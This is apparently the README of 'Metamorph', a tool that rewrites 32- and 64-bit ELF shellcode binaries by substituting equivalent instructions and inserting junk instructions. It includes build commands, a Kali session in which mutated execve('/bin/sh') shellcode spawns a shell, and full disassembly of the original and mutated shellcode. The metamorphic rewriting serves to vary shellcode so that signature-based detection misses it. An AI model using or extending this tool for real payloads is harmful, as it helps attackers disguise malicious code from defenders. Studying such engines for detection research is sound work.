# Metamorph

This code is a simple metamorphic engine that takes a 32-bit/64-bit ELF executable binary as input, and generates a 32-bit/64-bit metamorphicated ELF executable binary file. It currently supports injecting these instructions as NOP:
- NOP
- CMP [register],[register]
- PUSH [register] / POP [register]
- PUSHAD / POPAD

And altering these instructions:

mov [register 1], [register 2]

<table>
        <tr>
            <td align=center>Original</td>
            <td></td>
            <td align=center>Metamorphicated (sample 1)</td>
            <td align=center>Metamorphicated (sample 2)</td>
        </tr>
        <tr>
            <td>

```diff
- MOV ECX, ESP
```

</td>
<td align=center>→</td>
<td>
        
```diff
+ push ESP
+ pop ECX
```

</td>
<td>
        
```diff
+ XOR ECX, ECX 
+ ADD ECX, ESP
```

</td>
        </tr>
    </table>

- Original:
```diff
- xor [register], [register]
```
Sample 1:
```diff
+ mov [register], 0
```
Sample2:
```diff
+ sub [register], [register]
```

## Usage

Simply convert your assembly code into a machine code using these commands.

For 32-bit:
```
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 -s -o shellcode shellcode.o
```

For 64-bit:
```
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode
```

After that, you can use this tool to generate a metamorphicated 32-bit/64-bit ELF file:
```
./Metamorph shellcode new_executable
```

## Example:
```
┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ ./Metamorph x64shellcode x64shellcode2
Original file: 4680 bytes (64-bit)
Disassembled 12 instructions
Replaced 3 patterns:
  0x0: XOR RDI, RDI -> SUB RDI, RDI
  0x12: XOR RSI, RSI -> MOV RSI, 0
  0x1a: XOR RDX, RDX -> MOV RDX, 0
Injecting CMP RDX, RDX at offset 0x12

.text size change: 36 -> 47 bytes (+11)

Output file: 4691 bytes

Success: x64shellcode2

┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ ./x64shellcode2
$ whoami
kali
```

## Disassembly Difference
For original ELF:
```
┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ objdump -d -M intel x64shellcode

x64shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 31 ff                xor    rdi,rdi
  401003:       57                      push   rdi
  401004:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
  40100b:       73 68 00
  40100e:       57                      push   rdi
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       48 31 f6                xor    rsi,rsi
  401015:       56                      push   rsi
  401016:       57                      push   rdi
  401017:       48 89 e6                mov    rsi,rsp
  40101a:       48 31 d2                xor    rdx,rdx
  40101d:       b8 3b 00 00 00          mov    eax,0x3b
  401022:       0f 05                   syscall
```


For metamorphicated ELF:
```
┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ objdump -d -M intel x64shellcode2

x64shellcode2:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 29 ff                sub    rdi,rdi
  401003:       57                      push   rdi
  401004:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
  40100b:       73 68 00
  40100e:       57                      push   rdi
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       48 39 d2                cmp    rdx,rdx
  401015:       48 c7 c6 00 00 00 00    mov    rsi,0x0
  40101c:       56                      push   rsi
  40101d:       57                      push   rdi
  40101e:       48 89 e6                mov    rsi,rsp
  401021:       48 c7 c2 00 00 00 00    mov    rdx,0x0
  401028:       b8 3b 00 00 00          mov    eax,0x3b
  40102d:       0f 05                   syscall
```
